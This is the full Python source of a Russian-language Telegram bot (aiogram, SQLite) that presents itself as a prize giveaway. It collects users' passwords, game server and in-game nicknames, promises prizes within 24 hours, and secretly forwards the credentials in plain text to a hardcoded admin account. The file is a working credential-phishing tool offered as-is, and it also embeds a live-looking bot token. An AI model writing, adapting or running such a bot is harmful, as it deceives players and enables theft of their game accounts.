import asyncio
import re
import html
import sqlite3

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
)

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "9138947583:AAFvhIkPKW8maPZvTkdOCYdJ-EV65pugkwk"
ADMIN_ID  = 8849614274
DB_PATH   = "users.db"

# ==================== БАЗА ====================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id     INTEGER PRIMARY KEY,
            username    TEXT,
            nick_name   TEXT UNIQUE,
            password    TEXT,
            server      TEXT,
            game_nick   TEXT,
            reg_date    TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return row

def nickname_taken(nickname):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM users WHERE nick_name = ? COLLATE NOCASE", (nickname,))
    row = cur.fetchone()
    conn.close()
    return row is not None

def add_user(user_id, username, nick_name, password, server, game_nick):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT OR REPLACE INTO users (user_id, username, nick_name, password, server, game_nick) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, username, nick_name, password, server, game_nick),
    )
    conn.commit()
    conn.close()

# ==================== БОТ ====================
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

class Reg(StatesGroup):
    nickname  = State()
    password  = State()
    server    = State()
    game_nick = State()

NICK_PATTERN = re.compile(r"^[A-Za-z0-9_]{3,20}$")

def start_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➡️ Далее", callback_data="next")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user = get_user(message.from_user.id)

    if user:
        await message.answer(
            f"Привет, <b>{user[2]}</b>! 👋\n\n"
            f"Ты уже зарегистрирован в системе.\n"
            f"🎮 Твой игровой ник: <b>{user[5]}</b>\n"
            f"🌐 Сервер: <b>{user[4]}</b>",
            parse_mode="HTML",
        )
        return

    await message.answer(
        "👋 <b>Приветствую!</b>\n\n"
        "Чтобы получить доступ, надо зарегистрироваться в боте.\n\n"
        "Нажми «Далее», чтобы начать 👇",
        parse_mode="HTML",
        reply_markup=start_kb(),
    )

@dp.callback_query(F.data == "next")
async def cb_next(call: CallbackQuery, state: FSMContext):
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(
        "🏷 <b>Придумай свой Nick_Name</b>\n\n"
        "3–20 символов: латиница, цифры, <code>_</code>\n"
        "Например: <code>ivan_2025</code>",
        parse_mode="HTML",
    )
    await state.set_state(Reg.nickname)
    await call.answer()

@dp.message(Reg.nickname)
async def reg_nickname(message: Message, state: FSMContext):
    nickname = message.text.strip()

    if not NICK_PATTERN.match(nickname):
        await message.answer(
            "❌ Неверный формат.\n\n"
            "3–20 символов, латиница, цифры, <code>_</code>.",
            parse_mode="HTML",
        )
        return

    if nickname_taken(nickname):
        await message.answer(
            f"❌ Ник <code>{nickname}</code> уже занят.\nПридумай другой:",
            parse_mode="HTML",
        )
        return

    await state.update_data(nickname=nickname)
    await message.answer(
        f"✅ Nick_Name <b>{nickname}</b> придуман!\n\n"
        f"3️⃣ Теперь придумай свой <b>пароль</b> 🔐",
        parse_mode="HTML",
    )
    await state.set_state(Reg.password)

@dp.message(Reg.password)
async def reg_password(message: Message, state: FSMContext):
    password = message.text.strip()

    if len(password) < 3:
        await message.answer("❌ Пароль слишком короткий. Придумай другой:")
        return

    await state.update_data(password=password)
    await message.answer(
        "🌐 На каком <b>сервере</b> вы играете?\n"
        "(Напиши название сервера)",
        parse_mode="HTML",
    )
    await state.set_state(Reg.server)

@dp.message(Reg.server)
async def reg_server(message: Message, state: FSMContext):
    server = message.text.strip()

    if len(server) < 2:
        await message.answer("❌ Название сервера слишком короткое. Напиши еще раз:")
        return

    await state.update_data(server=server)
    await message.answer(
        "🎮 Теперь напиши свой <b>игровой никнейм</b> (как в игре):",
        parse_mode="HTML",
    )
    await state.set_state(Reg.game_nick)

@dp.message(Reg.game_nick)
async def reg_game_nick(message: Message, state: FSMContext):
    game_nick = message.text.strip()

    if len(game_nick) < 2:
        await message.answer("❌ Никнейм слишком короткий. Напиши еще раз:")
        return

    data = await state.get_data()
    nickname = data["nickname"]
    password = data["password"]
    server = data["server"]

    add_user(
        user_id=message.from_user.id,
        username=message.from_user.username or "",
        nick_name=nickname,
        password=password,
        server=server,
        game_nick=game_nick,
    )
    await state.clear()

    # Официальный ответ пользователю
    await message.answer(
        "✅ <b>Заявка успешно зарегистрирована!</b>\n\n"
        "🎁 <b>Особый кейс одобрен.</b>\n"
        "Зачисление призов будет произведено в течение 24 часов.\n\n"
        "Пожалуйста, ожидайте.",
        parse_mode="HTML",
    )

    # Отправка данных тебе (админу)
    if ADMIN_ID:
        tg = f"@{message.from_user.username}" if message.from_user.username else "—"
        admin_text = (
            "🆕 <b>Новая регистрация в боте!</b>\n\n"
            f"🏷 Логин: <b>{html.escape(nickname)}</b>\n"
            f"🔐 Пароль: {html.escape(password)}\n"
            f"🌐 Сервер: {html.escape(server)}\n"
            f"🎮 Игровой ник: <b>{html.escape(game_nick)}</b>\n\n"
            f"🔗 Telegram: {tg}\n"
            f"🆔 ID: <code>{message.from_user.id}</code>"
        )
        try:
            await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML")
        except Exception as e:
            print(f"⚠️ Не смог отправить админу: {e}")

@dp.message(Command("profile"))
async def cmd_profile(message: Message):
    user = get_user(message.from_user.id)
    if not user:
        await message.answer("Ты ещё не зарегистрирован. Напиши /start")
        return
    await message.answer(
        "📋 <b>Твой профиль</b>\n\n"
        f"🏷 Логин: <b>{user[2]}</b>\n"
        f"🔐 Пароль: <b>{html.escape(user[3])}</b>\n"
        f"🌐 Сервер: <b>{html.escape(user[4])}</b>\n"
        f"🎮 Игровой ник: <b>{html.escape(user[5])}</b>",
        parse_mode="HTML",
    )

@dp.message(Command("help"))
async def cmd_help(message: Message):
    await message.answer(
        "📖 <b>Команды</b>\n\n"
        "/start — регистрация\n"
        "/profile — профиль\n"
        "/help — помощь",
        parse_mode="HTML",
    )

@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Отменено. /start — начать заново.")

@dp.message()
async def fallback(message: Message):
    await message.answer("Не понимаю 🤔\nИспользуй /start или /help")

async def main():
    init_db()
    print("✅ Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())